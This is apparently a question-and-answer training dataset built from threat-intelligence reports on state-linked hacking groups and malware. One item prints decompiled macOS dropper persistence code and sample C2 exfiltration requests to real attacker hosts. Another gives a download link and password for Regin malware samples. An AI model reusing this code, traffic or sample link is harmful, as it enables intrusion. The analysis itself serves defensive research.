    "instruction": "Context: Small Headline: North Korea's cyber doctrine, strategies and goals\nNorth Korea's cyber warfare doctrine has not been clearly stated. However, based on cultural and technical observations, we may deduce that North Korea's cyber doctrine follows the tenets of juche nationalism and the songun doctrine.\nAlthough North Korea's limited online presence makes a thorough analysis of their cyber warfare capabilities a difficult task, it must be noted that what is known of those capabilities closely mirrors their kinetic warfare tactics. Cyber warfare is simply the modern chapter in North Korea's long history of asymmetrical warfare. North Korea has used various unconventional tactics in the\npast, such as guerilla warfare, strategic use of terrain, and psychological operations.146 The regime also aspires to create viable nuclear weapons. 147 Asymmetrical warfare is defined as \"a conflict in which the resources of two belligerents differ in essence and in the struggle, interact and attempt to exploit each other's characteristic weaknesses. Such struggles often involve strategies and tactics of unconventional warfare, the 'weaker' combatants attempting to use strategy to offset deficiencies in quantity or quality\". 148\nAccording to the aforementioned report to the House Armed Service Committee, \"Cyber warfare is an important asymmetric dimension of conflict that North Korea will probably continue to emphasize \u2014 in part because of its deniability and low relative costs.\"149 North Korea's poor economic state150 , further explains the regime's reliance on these tactics. In 2014, the regime reportedly spent 16% of its budget on defense.151 The North Korean military places a strong emphasis on information warfare capabilities including political and psychological warfare152 and cyber or hacker warfare.153\nThe report by Capt. Duk-Ki Kim, Ph.D. highlighted North Korea's counter-asymmetric strategy and ranked each based on intensity and frequency:\nSmall Headline: Cyber warfare operations\nJust ten years ago, experts noted that North Korea was one of the \"least network-ready and most isolated societies on the planet.\"155 Today North Korea's air-gapped networks and prioritization of resources for military use provide both a secure and structured base of operations for cyber operations and a secure means of communications.156 North Korea's hermit infrastructure creates\na cyber-terrain that deters reconnaissance. Because North Korea has few Internet connections to the outside world, anyone seeking intelligence on North Korea's networks has to expend more resources for cyber reconnaissance.157 A 2003 article by the U.S. Office of the National Counterintelligence Executive assessed that \"Development of the nation, rather than empowerment of the individual, appears to be driving DPRK efforts to develop domestic IT infrastructure and industry.\"158 In November 2013, Kim Jong Un referred to cyber warfare capabilities as a \"magic weapon\" in conjunction with nuclear weapons and missiles.159\n146 http://www.history.army.mil/brochures/kw-balance/balance.htm\n147 http://www.bbc.com/news/world-asia-pacific-11813699\n148 http://www.princeton.edu/~achaney/tmve/wiki100k/docs/Asymmetric_warfare.html\n149 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\n150 http://www.foreignpolicy.com/articles/2013/04/29/7_things_north_korea_is_really_good_at\n151 http://blogs.wsj.com/korearealtime/2014/04/10/north-korea-details-budget-plans/\n152 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n153 http://www.giac.org/paper/gsec/1870/information-warfare/103284\n154 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n155 http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH4.pdf\n156 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\nAccording to Kim Heung-kwang, a North Korean defector and former computer science professor, the regime has the following motivations for expanding its cyber warfare capabilities:160\n\uf0b7 Cyber capabilities are a cost-effective way to offset North Korea's lack of kinetic military prowess.\n\uf0b7 North Korea's school systems place a strong emphasis on math, giving the nation confidence in its programmers, cryptographers, and security researchers.\n\uf0b7 In the modern warfare landscape, cyber capabilities are potentially more utilitarian than heavy artillery or aircraft.\n\uf0b7 Cyber warfare capabilities provide a platform for espionage, psychological operations, and other forms of non-kinetic warfare.\n\uf0b7 Considering the separatist nature of North Korea's infrastructure, cyber warfare provides a strategic advantage since outbound attacks are possible, but inbound attacks would have limited reach.\n\uf0b7 Cyber warfare allows North Korea to leverage the Internet's inherent flaws for offensive purposes while maintaining its defenses, primarily via air-gapping its most critical networks from the outside world.\nNorth Korea's attack and defense capabilities reportedly include the following cyber warfare and electronic warfare components: offensive cyber operations (OCO); computer network operations (CNO), which includes both computer network attack (CNA) and computer network exploitation (CNE); distributed denial of service (DDoS);161 satellite monitoring; drones; GPS jamming capabilities162; and deployment of electromagnetic pulse (EMP).163 North Korea's OCO and CNO capabilities became apparent as early as 2004, when North Korea reportedly gained access to 33 of 80 South Korean military wireless communication networks. In June 2006, an attack on the U.S. State Department originating in the East Asia-Pacific region coincided with U.S.-North Korea negotiations over the regime's nuclear missile testing.164 A month later, a South Korean military report implicated North Korea's Unit 121 in hacking the South Korean and U.S. Defense Departments. North Korea also tested a logic bomb in October 2007. A logic bomb is malicious\ncode programmed to execute based on a pre-defined triggering event. Following the logic bomb test, the UN passed a resolution banning sales of certain computer hardware to North Korea.165\n157 http://www.huffingtonpost.com/2011/07/25/digital-revolution-north-korea_n_908368.html\n158 http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf\n159 http://english.chosun.com/site/data/html_dir/2013/11/05/2013110501790.html\n160 http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html\n161 (<http://www.google.com/url?q=http%3A%2F%2Fwww.defense.gov%2Fpubs%2FReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf&sa=D&sntz=1&usg=AFrqEzfhmQPPTuRKlcewmT2M5Oj7Xmg93Q>)http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf\n162https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n163 (<http://www.google.com/url?q=http%3A%2F%2Fwww.theregister.co.uk%2F2014%2F04%2F22%2Fnorks_drones_made_in_china%2F&sa=D&sntz=1&usg=AFrqEzfTItR6h7J68LY80JmBby_k12RQdw>)http://www.theregister.co.uk/2014/04/22/norks_drones_made_in_china/\n164 http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112?\nNorth Korea considers its cyber warfare capabilities an important asymmetric asset in the face of its perceived enemies, the U.S. and South Korea. While North Korea does not have an immersive digital culture, both the U.S. and South Korea are heavily dependent upon technological infrastructure for social, economic, and political stability.166 For this reason, a cyber attack that cripples or compromises the reliability of the U.S. or South Korea's technological infrastructure could have a far-reaching impact.\nSmall Headline: Gaming for profit and pwnage\nNorth Korea has reportedly used computer games for both illegal capital gain and orchestrating cyber attacks. In 2011, South Korean police arrested five individuals, including one Chinese national, for allegedly collaborating with North Korean hackers affiliated with the Korea Computer Center to steal money via online games. 167 According to South Korean reports, the culprits used an auto-player to quickly progress in the massively multiplayer online role-playing game (MMORPG) \"Lineage\" and were able to use the game's market to obtain real currency. 168 In 2013, South Korean officials released information stating they had found evidence that North Korea was using games as a medium for infecting machines and launching cyber attacks. North Korea had used game downloads to infect 100,000 South Korean machines for a botnet used to launch a distributed denial of service (DDoS) attack against Incheon Airport.169 This clever tactic sought to leverage a seemingly innocent game as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure target. However, in this case, there was little impact on the target.\nNorth Korea has used computer games for both illegal capital gain and orchestrating cyber attacks.\nAnswer this question: What are the primary motivations behind North Korea's expansion of its cyber warfare capabilities, and how do these motivations reflect the regime's broader military and economic strategies?",
    "output": "The primary motivations behind North Korea's expansion of its cyber warfare capabilities include offsetting its lack of kinetic military prowess, leveraging its strong educational system in math, utilizing cyber capabilities as a more utilitarian tool in modern warfare, and conducting espionage and psychological operations. These motivations reflect the regime's broader military and economic strategies by providing a cost-effective and strategic advantage, allowing North Korea to maintain its defensive posture while exploiting the Internet's vulnerabilities for offensive purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nThe Sofacy group continues its attack campaigns on government organizations, specifically the U.S. government in this latest spear-phishing example. The threat group added a new persistence mechanism that requires user interaction by loading its payload into Microsoft Office applications when opened, which may help the actors to evade detection. The use of this new persistence method shows the continued development of tactics and\ntechniques employed by this threat group, often times in clever ways as we observed in this instance.\nPalo Alto Networks customers are protected from the new Sofacy Carberp variant and can gather additional information using the following tools:\nWildFire detection of all known samples as malicious\nAll known C2s are classified as malicious in PAN-DB\nAutoFocus tags have been created (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.SofacyCarberp>)SofacyCarberp\n\nHow does the new persistence mechanism employed by the Sofacy group in their recent spear-phishing campaign against the U.S. government help the threat actors evade detection?",
    "output": "The new persistence mechanism employed by the Sofacy group requires user interaction by loading its payload into Microsoft Office applications when opened. This method helps the actors evade detection because it relies on legitimate user actions to execute the malicious code, making it less likely to be flagged by automated security systems that typically look for autonomous malware behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What strategies does the Poseidon Group employ to remain undetected for extended periods, and how do they adapt their toolkit to avoid correlation by security researchers?",
    "output": "The Poseidon Group remains undetected by employing a 'custom-tailored malware implants boutique' approach, crafting campaign components on-demand and sometimes creating entirely unique malicious artifacts. This strategy makes it challenging for security researchers to connect different campaigns under a single threat actor. Their toolkit is artisanally adaptive, changing from infection to infection to fit custom-tailored requirements for each client. Additionally, they use diverse command and control servers located in different countries, sign malware with different certificates issued in the name of rogue companies, and design their campaigns to run on specific machines using English and Portuguese languages. These tactics contribute to the difficulty in correlating indicators and evidence, allowing the group to operate undetected for many years.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: The Operators' Mistake\nDuring one of these phishing campaigns against webmail users, the operators used Bitly (<>)[12] to shorten the URLs contained in the emails. To do so, they created a few accounts on Bitly, and used each of them to shorten multiple phishing URLs. Luckily enough for us, one of those Bitly accounts was set as\"public\", which allows everyone to see the list of URLs that were shortened by this account, with the exact time at which they were shortened.\nThe public profile feature has been removed from Bitly (<>)[13], and hence the list is no longer available.\nInterestingly, each URL that was shortened contained the email address and the name of the target. Having this information in the URL allowed the fake login panel to display them easily, as shown in , rather than requiring an instance of the login panel for each target. An example of a URL that was shortened is shown below:\nhttp://login.accoounts-google.com/ url/?continue=cGFyZXBreWl2QGdtYWlsLmNvbQ==&df=UGFraXN0YW4rRW1iYXNzeStLeWl2&tel=1\nHere, the continue parameter contains parepkyiv@gmail.com encoded in base64, while the df parameter contains Pakistan+Embassy+Kyiv. Therefore, it is possible to identify the target precisely from a URL that was shortened, in this case the Pakistan Embassy in Kiev.\nMedium Headline: What Is in the List?\nThe list contains around 4,400 URLs that were shortened between 16th of March 2015 and 14th of September 2015. Assuming that the time at which a URL was shortened corresponds roughly to the moment when the corresponding phishing email was sent, it allows us to create a relatively accurate timeline of the events related to these phishing attacks.\nFirst, the number of URLs that were shortened per day is showed in Figure 5 for the first (and most active) two months of the account's activity.\nThere were regular peaks in the number of URLs that were shortened, usually Monday or Friday, probably corresponding to the launch of new phishing campaigns. Also, there is almost no activity during the weekends indicating that the operators are likely to work only on weekdays.\nSecondly, the same target may appear in several URLs, probably corresponding to repeated phishing attempts. The list contains 1,888 unique target email addresses, most of them being Gmail addresses. Figure 6 shows the number of times the targets were attacked.\nMore than half of the targets were attacked only once, and in most of these cases the corresponding shortened URL was clicked at least once, according to the Bitly statistics. On the other hand, the others targets have been attacked several times during the six months of data, with a maximum of seven attempts against nine of them. Most of the corresponding shortened URLs were not visited. In other words, the targets are regularly attacked until an attempt to phish succeeds, and for more than half of the targets one attempt was enough.\nThe number of clicks on a Bitly-shortened URL is publicly available, by appending a\"+\" to the shortened URL, with the countries from which those clicks originated. Nevertheless, one can not know whether a shortened URL was visited by the intended target, or someone else.\nFinally, since we know the exact time when a URL was shortened, we can display the hour of the day when it happened, as shown in Figure 7.\nInterestingly, the distribution of the hours matches the working hours from 9AM to 5PM in the UTC+3 time zone, with sometimes some activity in the evening. This may indicate that the operators work from this time zone (<>)[14].\nMedium Headline: What Kind of Targets?\nAs the list contains mostly Gmail addresses, the majority of the targeted emails belong to individuals. Nevertheless, the following organizations also have Gmail addresses that were targeted:\n\u2022 Embassies belonging to Algeria, Brazil, Colombia, Djibouti, India, Iraq, North Korea, Kyrgyzstan, Lebanon, Myanmar, Pakistan, South Africa, Turkmenistan, United Arab Emirates, Uzbekistan and Zambia\n\u2022 Ministries of Defense in Argentina, Bangladesh, South Korea, Turkey and Ukraine\nRegarding the individuals targeted, here are a few of their positions that are typical of the list:\n\u2022 Political leaders and heads of police of Ukraine\n\u2022 Members of NATO institutions\n\u2022 Members of the People's Freedom Party, a Russian liberal democratic political party (<>)[15]\n\u2022 Russian political dissidents\n\u2022 \"Shaltay Boltai\", an anonymous Russian group known to release private emails of Russian politicians (<>)[16]\n\u2022 Journalists located in Eastern Europe\n\u2022 Academics visiting Russian universities\n\u2022 Chechen organizations\nOverall, most of the targets we could identify are related by the fact that they all share the same standpoint in the current political situation in Eastern Europe.\nWhile this list only provides a partial view of the Sednit group's targets, another list was analyzed by Trend Micro, with similar findings (<>)[17].\n\nQ: How did the Sednit group's use of Bitly for URL shortening provide valuable insights into their phishing campaign strategies?",
    "output": "A: The Sednit group used Bitly to shorten URLs for their phishing campaigns, and one of their Bitly accounts was set to 'public', allowing researchers to access the list of shortened URLs along with the exact times they were created. Each URL contained the email address and name of the target, enabling precise identification of the targets. For example, a URL might contain parameters like 'parepkyiv@gmail.com' and 'Pakistan+Embassy+Kyiv' encoded in base64. This information helped researchers understand the targets and the timing of the phishing campaigns, revealing that the operators worked mainly during weekdays and within the UTC+3 time zone.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What anti-reversing techniques does the Carbanak malware employ to evade detection and analysis?",
    "output": "The Carbanak malware employs several anti-reversing techniques, including checking for the 'isDebugged' flag in the Process Environment Block (PEB), monitoring for significant delays in code execution using the GetTickCount() function, and heavily obfuscating strings to avoid static string analysis. It utilizes a decoder table loaded in memory for its lookup algorithm, deobfuscating strings on-the-fly. Additionally, it uses an API hashing technique to hide relevant API functions, looking up equivalent API names from a generated hash table instead of storing imported API names in the body.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Targeting\nWe identified one gambling company in the Philippines as compromised by this campaign. Interestingly, the threat actor registered a domain name similar to the company name and used it as a C&C. This was not surprising as we have noticed this threat actor targeting this industry since 2019 during our (<https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf>)Operation DRBControl investigation, and  in 2021 with an update of SysUpdate. We also attempted to notify the company of this incident through all their listed channels but have received no feedback.\nAs stated in the \"Infection Vector\" section, we noticed the Youdu chat application was probably used as a lure. It is worth mentioning that the customers mentioned in the Youdu official website are all located inside China, which could be an indicator of the threat actor's interest in targets related to this country.\nConclusion\nThis investigation confirms that Iron Tiger regularly updates its tools to add new features and probably to ease their portability to other platforms, verifying the interest we found from this threat actor for Linux or Mac OS. It also corroborates this threat actor's interest in the gambling industry and the South East Asia region, as we previously noted in  and .\nThis campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger. We expect to find further updates of these tools in the future to accommodate other platforms and apps.\nAs an additional warning, we want to highlight that the targeting can be wider than the samples and targeting we have already observed. In 2022, we  a campaign targeting Taiwan and the Philippines that made use of HyperBro samples (detected by Trend Micro as Backdoor.Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate. The BfV, a German governmental entity, published a (<https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2022-01-bfv-cyber-brief.pdf?__blob=publicationFile&v=10>)report in January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate. In October 2022, Intrinsec (<https://www.intrinsec.com/apt27-analysis/>)reported an incident in a French company also using HyperBro samples matching the structure we described in our 2021 (<https://www.trendmicro.com/en_no/research/21/d/iron-tiger-apt-updates-toolkit-with-evolved-sysupdate-malware-va.html>)investigation. This shows the threat actor is likely to reuse the tools mentioned here in future campaigns that might target different regions or industries in the short and long term. Considering the active campaign and regular developments made on this malware family, organizations are advised to enhance and broaden their current and established security measures, and heighten overall vigilance for possible infection vectors that can be abused by this threat group.\nIndicators of Compromise (IOCs)\nDownload the full list of indicators .\nQuestion: How does Iron Tiger leverage domain name registration and C&C infrastructure setup to target specific industries, and what implications does this have for organizations in those sectors?",
    "output": "Answer: Iron Tiger registers domain names similar to the names of targeted companies and uses them as Command and Control (C&C) servers. This tactic was observed in the case of a gambling company in the Philippines, which aligns with the group's historical interest in the gambling industry and the Southeast Asia region. This approach makes it easier for the threat actor to blend in with legitimate traffic and evade detection. Organizations need to be vigilant about domain registrations that mimic their own and monitor for unusual network activity to detect such targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: A. Context\nIn mid-February this year, we discovered a new Mac sample that appeared to be the Mac version of the APT28 XAgent component. This backdoor component is known to have a modular structure featuring various espionage functionalities, such as key-logging, screen grabbing and file exfiltration. Until now this component was only available for Windows, Linux and iOS operating systems. Though you might expect this Mac version of XAgent to be the iOS version compiled to work on Mac, it is a different creation, with a much more advanced feature set.\nThe Mac version shares multiple similarities with those designed for other operating systems. However, the Mac agent brings more spying capabilities such as stealing iOS backups from Mac computers, which contain messages, contacts, voicemail, call history, notes, calendar and Safari data.\nBig Headline: B. Attack Flow\nLast year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the 'Komplex' name. The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.\n1. The Komplex Binder: Is the main executable of \"roskosmos_2015-2025.app\". Its main purpose is to save a second payload(the dropper) on the system and open the decoy pdf file pictured below.\nThe Komplex Binder\nKomplex: roskosmos_2015-2025.pdf\n2. The Komplex Dropper: Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the infected system\nsystem(\"mkdir -p /Users/Shared/.local/ &> /dev/null\"); system(\"mkdir -p ~/Library/LaunchAgents/ &> /dev/null\"); off_10001B4F0(v5, &off_10001B4F0, CFSTR(\"/Users/Shared/.local/kextd\"), 1LL); off_10001B4F0(v6, &off_10001B4F0, CFSTR(\"/Users/Shared/com.apple.updates.plist\"), 1LL); off_10001B4F0(v7, &off_10001B4F0, CFSTR(\"/Users/Shared/start.sh\"), 1LL); system(\"cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/  &>/dev/null\"); remove(\"/Users/Shared/com.apple.updates.plist\"); system(\"chmod 755 /Users/Shared/.local/kextd\"); system(\"chmod 755 /Users/Shared/start.sh\");\n3. The Komplex Payload: Is the final component of the Komplex malware, with the sole purpose of downloading and executing a file, as requested by the C&C servers.\nIn other words, Komplex is an APT28/Sofacy component that can be distributed via email, disguised as a PDF document, to establish a foothold in a system. Once it infects the host, it can download and run the next APT28/Sofacy component, which - to the best of our knowledge - is the XAgent malware that forms the object of this paper.\nOur assumption is guided by hard evidence included in the binary. Our forensics endeavor revealed a number of indicators that made us think XAgent was distributed via Komplex malware:\nPossible Attack Flow\nMedium Headline: 1. Receiving commands from C&C server\nThe agent awaits C&C commands from the server and inserts them into a command queue that will be executed in a separate thread by MainHandler module.\nThe command structure, called cmdPacket, contains a command identifier, a command parameter and a size for the parameter.\nstruct cmdPacket {\nunsigned char cmd;\nchar *param;\nunsigned long long param_size;\n};\nCommand Structure\nThe command request to the C&C server is made via HTTP GET. It receives a base64 encoded cmdPacket that has previously been encrypted with RC4 using a hardcoded KERNEL_CRYPTO_MAIN_KEY.\nRequest a command from server\n-\nGET http://apple-iclods.org/close/?itwm=LO6iN\nPjpD0U8AVlLo_Hk3X9FSgAF&xzxI4=9_qwCS03APJT HTTP/1.1\nHost: apple-iclods.org\nPragma: no-cache\nConnection: keep-alive\nAccept: */*\nUser-Agent: 4fe4b9560e99e33dabca553e2eeee510\nCFNetwork/673.3 Darwin/13.4.0 (x86_64)\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nExample of GET message\nBased on the command from the C&C server, the agent decodes and decrypts the command structure, and inserts it in a command queue to be executed by the MainHandler module.\nC&C Commands and Actions\nMedium Headline: 2. Sending information to C&C server\nTo exfiltrate information to the C&C server (such as screenshots, passwords, files and more), the agent uses a defined structure called msgPacket.\nstruct msgPacket { int agent_id; short module_id; unsigned char cmd_id; char *data_; unsigned int data_size; unsigned char priority;\n};\nMessage Structure\nThe message is encrypted with RC4 with a hardcoded KERNEL_CRYPTO_MAIN_KEY. It then appends a key and a DATA_TOKEN xor-ed with the key. Ultimately, the module encodes the result with base64 and sends it to the C&C server in a POST request.\nSend message to server\nWhen starting the communication, the agent sends a hello message to the server using the POST request detailed above. This request has the following HTTP body:\nHello message body\nhttp://23.227.196.215/watch/?itwm=7FJcXOPyN_Znh7quXfh4WAaKquNzY\nPOST\n&oe=9cu2LRvfab&ags=Pi8KZsjwBh&oe=HXK20P&aq=h2RBWMQI&aq=yRRTH&i5H=MKNBXTB\nHost: 23.227.196.215\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nConnection: keep-alive\nProxy-Connection: keep-alive\nAccept: */*\nUser-Agent: 4fe4b9560e99e33dabca553e2eeee510 (unknown version) CFNetwork/673.3 Darwin/13.4.0 (x86_64)\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nContent-Length: 81\n0_a70HpSuFQI7FnNetyKM559SUEcCj-WBinNUfTdPQw0ZVTfyNXe26b6isibFp_cJLGqtiOZ9Em3iUA==\nExample of Hello Message\nQ: How does the APT28 XAgent communicate with its Command and Control (C&C) server, including the structures used for receiving commands and sending information, and the encryption methods employed?",
    "output": "The APT28 XAgent communicates with its C&C server using specific structures and encryption methods. For receiving commands, the agent waits for C&C commands, which are inserted into a command queue and executed by the MainHandler module. The command structure, called cmdPacket, includes a command identifier, a command parameter, and a size for the parameter. Commands are requested via HTTP GET and received in a base64 encoded format, encrypted with RC4 using a hardcoded KERNEL_CRYPTO_MAIN_KEY. For sending information, the agent uses a msgPacket structure containing details like agent ID, module ID, command ID, data, data size, and priority. The message is encrypted with RC4, appended with a key and DATA_TOKEN xor-ed with the key, and then base64 encoded before being sent to the C&C server via a POST request.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: SECRET MALWARE IN EUROPEAN UNION ATTACK LINKED TO U.S. AND BRITISH INTELLIGENCE\nComplex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the European Union and a Belgian telecommunications company, according to security industry sources and technical analysis conducted by The Intercept.\nRegin was found on infected internal computer systems and email servers at Belgacom, a partly state-owned Belgian phone and internet provider, following reports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications Headquarters, industry sources told The Intercept.\nThe malware, which steals data from infected systems and disguises itself as legitimate Microsoft software, has also been identified on the same European Union computer systems that were targeted for surveillance by the National Security Agency.\nThe hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward Snowden. The specific malware used in the attacks has never been disclosed, however.\nThe Regin malware, whose existence was (<http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance>)first reported by the security firm Symantec on Sunday, is among the most sophisticated ever discovered by researchers. Symantec compared Regin to Stuxnet, a state-sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility. Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their systems after they were compromised, linking the spy tool to the secret GCHQ and NSA operations.\nRonald Prins, a security expert whose company (<https://www.fox-it.com/en/>)Fox IT was hired to remove the malware from Belgacom's networks, told The Intercept that it was \"the most sophisticated malware\" he had ever studied.\n\"Having analyzed this malware and looked at the [previously published] Snowden documents,\" Prins said, \"I'm convinced Regin is used by British and American intelligence services.\"\nA spokesman for Belgacom declined to comment specifically about the Regin revelations, but said that the company had shared \"every element about the attack\" with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion. \"It's impossible for us to comment on this,\" said Jan Margot, a spokesman for Belgacom. \"It's always been clear to us the malware was highly sophisticated, but ever since the clean-up this whole story belongs to the past for us.\"\nIn a hacking mission codenamed Operation Socialist, GCHQ gained access to Belgacom's internal systems in 2010 by targeting engineers at the company. The agency secretly installed so-called malware \"implants\" on the employees' computers by sending their internet connection to (<http://www.spiegel.de/international/world/ghcq-targets-engineers-with-fake-linkedin-pages-a-932821.html>)a fake LinkedIn page. The malicious LinkedIn page launched a malware attack, infecting the employees' computers and giving the spies total control of their systems, allowing GCHQ to get deep inside Belgacom's networks to steal data.\nThe implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the company's network and customers, which include the European Commission, the European Parliament, and the European Council. The software implants used in this case were part of the suite of malware now known as Regin.\nOne of the keys to Regin is its stealth: To avoid detection and frustrate analysis, malware used in such operations frequently adhere to a modular design. This involves the deployment of the malware in stages, making it more difficult to analyze and mitigating certain risks of being caught.\nBased on an analysis of the malware samples, Regin appears to have been developed over the course of more than a decade; The Intercept has identified traces of its components dating back as far as 2003. Regin was (<http://2014.hack.lu/archive/2014/hacklu-joker-presentation.pdf>)mentioned at a recent Hack.lu conference in Luxembourg, and Symantec's (<http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance>)report on Sunday said the\nfirm had identified Regin on infected systems operated by private companies, government entities, and research institutes in countries such as Russia, Saudi Arabia, Mexico, Ireland, Belgium, and Iran.\nThe use of hacking techniques and malware in state-sponsored espionage has been (<http://www.washingtonpost.com/wp-dyn/content/article/2010/01/13/AR2010011300359.html>)publicly (<http://www.nytimes.com/2013/02/19/technology/chinas-army-is-seen-as-tied-to-hacking-against-us.html?pagewanted=all>)documented over the last few years: China has been linked to extensive cyber espionage, and recently the Russian government was also (<http://www.theatlantic.com/politics/archive/2014/10/white-house-hacked/382063/>)alleged to have been behind a cyber attack on the White House. Regin further demonstrates that Western intelligence agencies are also involved in covert cyberespionage.\nGCHQ declined to comment for this story. The agency issued its standard response to inquiries, saying that \"it is longstanding policy that we do not comment on intelligence matters\" and \"all of GCHQ's work is carried out in accordance with a strict legal and policy framework, which ensures that our activities are authorised, necessary and proportionate.\"\nThe NSA said in a statement, \"We are not going to comment on The Intercept's speculation.\"\nThe Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to encourage further research and analysis. (To download the malware, click (<https://s3.amazonaws.com/tiregin/regin.zip>)here. The file is encrypted; to access it on your machine use the password \"infected.\") What follows is a brief technical analysis of Regin conducted by The Intercept's computer security staff. Regin is an extremely complex, multi-faceted piece of work and this is by no means a definitive analysis.\nIn the coming weeks, The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian and Dutch newspapers (<http://www.standaard.be/cnt/dmf20141124_01393276>)De Standaard and (<http://www.nrc.nl/nieuws/2014/11/24/kwaadaardige-malware-regin-gebruikt-bij-hack-belgacom/>)NRC Handelsblad.\n\nQuestion: How did the GCHQ gain access to Belgacom's internal systems during Operation Socialist, and what role did the Regin malware play in this operation?\n\nAnswer:",
    "output": "During Operation Socialist, GCHQ gained access to Belgacom's internal systems by targeting engineers at the company. They achieved this by redirecting the engineers' internet connections to a fake LinkedIn page, which then launched a malware attack. This attack infected the engineers' computers and gave GCHQ total control of their systems. The malware implants used in this operation were part of the suite of malware known as Regin. These implants allowed GCHQ to conduct surveillance of internal Belgacom communications and gather data from the company's network and customers, including the European Commission, the European Parliament, and the European Council.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the integration of Plugx shellcode in some samples, along with the presence of inactive encrypted Zbot, reflect the evolving relationship between common cybercrime and advanced persistent threats (APTs)?",
    "output": "The integration of Plugx shellcode in some samples, along with the presence of inactive encrypted Zbot, reflects a blurring line between common cybercrime and advanced persistent threats (APTs). The fact that common malware authors are adopting techniques from APT players, such as document-based exploitation, and vice versa, shows a symbiotic relationship where ideas are shared between these distinct criminal groups. This evolution underscores the need for cybersecurity professionals to stay vigilant against both types of threats, as the methods used by one group can quickly be adopted by the other, making attribution and defense more challenging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nDragos, Inc. was notified by the Slovak anti-virus firm ESET of an ICS tailored malware on June 8th, 2017. The Dragos team was able to use this notification to find samples of the malware, identify new functionality and impact scenarios, and confirm that this was the malware employed in the December 17th, 2016 cyber-attack on the Kiev, Ukraine transmission substation which resulted in electric grid operations impact. This report serves as an industry report to inform the electric sector and security community of the potential implications of this malware and the appropriate details to have a nuanced discussion.\nBig Headline: Why Are We Publishing This\nSecurity firms must always balance a need to inform the public against empowering adversaries with feedback on how they are being detected and analyzed. This case is no different. In fact, it is more important given that there is no simple fix as the capability described in this report takes advantage of the knowledge of electric grid systems. It is not an aspect of technical vulnerability and exploitation. It cannot just be patched or architected away although the electric grid is entirely defensible. Human defenders leveraging an active defense such as hunting and responding internally to the industrial control system (ICS) networks can ensure that security is maintained.\nBig Headline: Key Takeaways\n\u2022 The malware self-identifies as \"crash\" in multiple locations thus leading to the naming convention \"CRASHOVERRIDE\" for the malware framework.\n\u2022 CRASHOVERRIDE is the first ever malware framework designed and deployed to attack electric grids.\n\u2022 CRASHOVERRIDE is the fourth ever piece of ICS-tailored malware (STUXNET, BLACKENERGY 2, and HAVEX were the first three) used against targets and the second ever to be designed and deployed for disrupting physical industrial processes (STUXNET was the first).\n\u2022 CRASHOVERRIDE is not unique to any particular vendor or configuration and instead leverages knowledge of grid operations and network communications to cause impact; in that way, it can be immediately re-purposed in Europe and portions of the Middle East and Asia.\n\u2022 CRASHOVERRIDE is extensible and with a small amount of tailoring such as the inclusion of a DNP3 protocol stack would also be effective in the North American grid.\n\u2022 CRASHOVERRIDE could be leveraged at multiple sites simultaneously, but the scenario is not cataclysmic and would result in hours, potentially a few days, of outages, not 